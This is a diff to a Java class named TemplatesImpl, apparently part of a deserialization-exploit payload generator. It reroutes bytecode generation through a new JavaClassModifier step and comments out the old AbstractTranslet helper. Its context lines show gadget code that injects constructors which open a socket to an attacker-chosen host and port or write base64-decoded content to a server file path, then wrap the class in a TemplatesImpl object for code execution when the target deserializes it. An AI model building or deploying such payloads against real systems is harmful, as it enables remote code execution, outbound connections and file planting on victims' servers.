@@ -3,6 +3,7 @@ package com.ppp.sinks;
 import com.ppp.JavaClassBuilder;
 import com.ppp.JavaClassHelper;
 import com.ppp.Printer;
+import com.ppp.middleware.builder.JavaClassModifier;
 import com.ppp.sinks.annotation.EnchantType;
 import com.ppp.sinks.annotation.Sink;
 import com.ppp.utils.ClassFiles;
@@ -47,11 +48,10 @@ public class TemplatesImpl {
         ctClass.defrost();
         ctClass.addField(CtField.make("private static final long SerialVersionUIDDemo = 8207363842866235160L;", ctClass));
 
-        // 是否继承 AbstractTranslet
-        extendsAbstractTranslet(ctClass, sinksHelper);
+        // CtClass 增强
+        byte[] bytes = JavaClassModifier.ctClassBuilderExt(ctClass, sinksHelper.getJavaClassHelper());
 
-
-        return createTemplatesImpl(ctClass.toBytecode());
+        return createTemplatesImpl(bytes);
     }
 
 
@@ -83,11 +83,10 @@ public class TemplatesImpl {
         ctClass.addConstructor(ctConstructor);
 
 
-        // 是否继承 AbstractTranslet
-        extendsAbstractTranslet(ctClass, sinksHelper);
+        // CtClass 增强
+        byte[] bytes = JavaClassModifier.ctClassBuilderExt(ctClass, sinksHelper.getJavaClassHelper());
 
-//        new BASE64Encoder().encode(ctClass.toBytecode());
-        return createTemplatesImpl(ctClass.toBytecode());
+        return createTemplatesImpl(bytes);
     }
 
     /**
@@ -115,11 +114,10 @@ public class TemplatesImpl {
         ctConstructor.setBody(String.format("new java.net.Socket(\"%s\", %d);", host, port));
         ctClass.addConstructor(ctConstructor);
 
-        // 是否继承 AbstractTranslet
-        extendsAbstractTranslet(ctClass, sinksHelper);
+        // CtClass 增强
+        byte[] bytes = JavaClassModifier.ctClassBuilderExt(ctClass, sinksHelper.getJavaClassHelper());
 
-//        new BASE64Encoder().encode(ctClass.toBytecode());
-        return createTemplatesImpl(ctClass.toBytecode());
+        return createTemplatesImpl(bytes);
     }
 
     /**
@@ -171,11 +169,10 @@ public class TemplatesImpl {
         }
 
 
-        // 是否继承 AbstractTranslet
-        extendsAbstractTranslet(ctClass, sinksHelper);
+        // CtClass 增强
+        byte[] bytes = JavaClassModifier.ctClassBuilderExt(ctClass, sinksHelper.getJavaClassHelper());
 
-//        new BASE64Encoder().encode(ctClass.toBytecode());
-        return createTemplatesImpl(ctClass.toBytecode());
+        return createTemplatesImpl(bytes);
     }
 
     /**
@@ -222,8 +219,10 @@ public class TemplatesImpl {
                 "        fileOutputStream.close();}", b64, serverFilePath));
         ctClass.addConstructor(ctConstructor);
 
+        // CtClass 增强
+        byte[] bytes = JavaClassModifier.ctClassBuilderExt(ctClass, sinksHelper.getJavaClassHelper());
 
-        return createTemplatesImpl(ctClass.toBytecode());
+        return createTemplatesImpl(bytes);
     }
 
 
@@ -245,22 +244,29 @@ public class TemplatesImpl {
     }
 
 
-    /**
-     * 是否继承 AbstractTranslet
-     *
-     * @param ctClass
-     * @param sinksHelper
-     * @throws Exception
-     */
-    public static void extendsAbstractTranslet(CtClass ctClass, SinksHelper sinksHelper) throws Exception {
-        if (!sinksHelper.isExtendsAbstractTranslet()) {
-            return;
-        }
-        ClassPool pool = ClassPool.getDefault();
-        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
-        CtClass superCtClass = pool.get(AbstractTranslet.class.getName());
-        ctClass.setSuperclass(superCtClass);
-    }
+//    public static void ctClassScheduler(CtClass ctClass, SinksHelper sinksHelper) throws Exception{
+//        // 是否继承 AbstractTranslet
+//        extendsAbstractTranslet(ctClass, sinksHelper);
+//
+//        //
+//    }
+//
+//    /**
+//     * 是否继承 AbstractTranslet
+//     *
+//     * @param ctClass
+//     * @param sinksHelper
+//     * @throws Exception
+//     */
+//    public static void extendsAbstractTranslet(CtClass ctClass, SinksHelper sinksHelper) throws Exception {
+//        if (!sinksHelper.isExtendsAbstractTranslet()) {
+//            return;
+//        }
+//        ClassPool pool = ClassPool.getDefault();
+//        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
+//        CtClass superCtClass = pool.get(AbstractTranslet.class.getName());
+//        ctClass.setSuperclass(superCtClass);
+//    }
 
 
     public static Object createTemplatesImpl(final byte[] classBytes) throws Exception {
